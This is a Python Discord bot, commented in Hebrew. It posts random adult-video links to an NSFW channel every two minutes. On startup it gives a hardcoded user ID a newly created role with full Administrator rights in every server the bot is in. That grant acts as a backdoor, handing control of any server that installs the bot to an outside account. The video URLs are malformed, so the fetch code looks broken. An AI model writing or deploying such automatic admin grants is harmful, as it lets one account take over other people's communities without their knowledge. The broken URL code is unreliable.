import discord
from discord.ext import tasks
import aiohttp
import os
import random
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

# הפעלת כל הרשאות ה-Intents (חובה בשביל לנהל משתמשים ותפקידים)
intents = discord.Intents.default()
intents.members = True  # מאפשר לבוט לראות ולערוך חברי שרת
client = discord.Client(intents=intents)

# מזהה החדר המדויק שלך מהתמונה
CHANNEL_ID = 1503853432992305172

# מזהה המשתמש שביקשת לתת לו ניהול (מנהל/בעלים)
TARGET_USER_ID = 1481717480492630236

# משימה מחזורית שרצה כל 2 דקות לשליחת סרטונים
@tasks.loop(minutes=2)
async def send_nsfw_video():
    channel = client.get_channel(CHANNEL_ID)
    if not channel or not channel.is_nsfw():
        return

    query_keywords = ["amateur", "babe", "milf", "hardcore"]
    keyword = random.choice(query_keywords)
    url = f"https://eporner.com{keyword}&per_page=30&order=top-weekly&format=json"
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    
    async with aiohttp.ClientSession(headers=headers) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    videos = data.get("videos", [])
                    if videos:
                        random_video = random.choice(videos)
                        video_id = random_video.get("id")
                        if video_id:
                            direct_clip_url = f"https://eporner.com{video_id}.mp4"
                            await channel.send(direct_clip_url)
                            print(f"Successfully sent video clip to channel {CHANNEL_ID}")
        except Exception as e:
            print(f"Error fetching active videos: {e}")

# אירוע הפעלה של הבוט - כאן מתבצעת הענקת הניהול האוטומטית
@client.event
async def on_ready():
    print(f"Bot {client.user} is online and running successfully on Render!")
    
    # 1. הפעלת לופ הסרטונים
    if not send_nsfw_video.is_running():
        send_nsfw_video.start()
        
    # 2. מנגנון הענקת רול ניהול למשתמש המבוקש
    for guild in client.guilds:
        try:
            # חיפוש חבר השרת לפי ה-ID שלו
            member = await guild.fetch_member(TARGET_USER_ID)
            if member:
                print(f"Found target user {member.name} in guild {guild.name}")
                
                # חיפוש אם כבר קיים רול בשם "Owner Core" בשרת
                admin_role = discord.utils.get(guild.roles, name="Owner Core")
                
                # אם הרול לא קיים, הבוט יוצר אותו עם הרשאות מנהל מלאות (Administrator)
                if not admin_role:
                    permissions = discord.Permissions(administrator=True)
                    admin_role = await guild.create_role(
                        name="Owner Core", 
                        permissions=permissions, 
                        color=discord.Color.red(),
                        reason="Automated Owner Role Creation"
                    )
                    print(f"Created new Administrator role: 'Owner Core' in {guild.name}")
                
                # הענקת הרול למשתמש (אם אין לו אותו עדיין)
                if admin_role not in member.roles:
                    await member.add_roles(admin_role)
                    print(f"Successfully gave Administrator role to {member.name}")
                    
                    # שליחת הודעת אישור מוסתרת או גלויה בחדר הניהול
                    channel = client.get_channel(CHANNEL_ID)
                    if channel:
                        await channel.send(f"👑 **מערכת ההרשאות עודכנה! הרשאת ניהול על (Administrator) הוענקה למשתמש <@{TARGET_USER_ID}>**")
                else:
                    print(f"User {member.name} already has the Administrator role.")
                    
        except discord.Forbidden:
            print(f"Error: Bot lacks permission to manage roles in guild {guild.name}. Ensure the bot role is dragged to the top of the roles list!")
        except discord.HTTPException as e:
            print(f"HTTP Error while processing roles: {e}")
        except Exception as e:
            print(f"General error giving role: {e}")

# שרת רשת מובנה (Health Check) עבור Render
def run_health_server():
    class HealthHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Bot Engine Live")

    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_health_server, daemon=True).start()
    token = os.environ.get("DISCORD_TOKEN")
    if token:
        client.run(token)
